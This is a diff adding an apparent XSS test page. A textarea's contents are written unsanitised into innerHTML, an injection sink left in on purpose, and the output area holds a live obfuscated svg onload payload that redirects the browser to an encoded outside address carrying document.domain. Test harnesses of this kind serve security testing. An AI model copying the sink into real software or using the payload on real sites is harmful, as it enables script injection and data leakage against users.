@@ -1,0 +1,29 @@
+<!doctype html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>XSS Test</title>
+</head>
+
+<body>
+    <h1>XSS Test</h1>
+    <p>Input:</p>
+    <textarea rows="8" cols="80" id="input"></textarea>
+    <button onclick="run();">run</button>
+    <p>Output:</p>
+    <div id="output">
+        <svg id=\ onload=location=id+id+12345609861+domain+id+1234+id
+    </div>
+    <script>
+        function run() {
+            var el = document.getElementById('input');
+            var scriptText = el.value;
+            var scriptContainer = document.getElementById('output');
+            scriptContainer.innerHTML = scriptText;
+        }
+    </script>
+</body>
+
+</html>
